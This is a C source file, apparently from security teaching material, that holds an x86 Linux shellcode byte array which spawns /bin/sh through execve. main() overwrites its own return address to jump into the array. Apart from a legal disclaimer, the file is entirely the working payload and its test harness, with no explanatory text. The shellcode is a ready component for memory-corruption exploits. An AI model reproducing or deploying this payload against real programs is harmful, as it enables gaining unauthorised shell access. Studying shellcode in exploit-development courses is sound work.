/*
* This code is provided and to be used for educational purpose only.
* Computer misuse is a serious crime in Singapore and other
* countries, punishable by law.
*
* THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
* IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
* FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
* AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
* LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
* OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
* SOFTWARE.
*/

static unsigned char shellcode[]={
'\xeb','\x16','\x31','\xc0','\x5b','\x88','\x43','\x07','\x89','\x5b',
'\x08','\x89','\x43','\x0c','\xb0','\x0b','\x8d','\x4b','\x08','\x8d',
'\x53','\x0c','\xcd','\x80','\xe8','\xe5','\xff','\xff','\xff','\x2f',
'\x62','\x69','\x6e','\x2f','\x73','\x68'};


int main()
{
        int *ret;
        ret = (int *)&ret + 2;
        (*ret) = (int)shellcode;
}


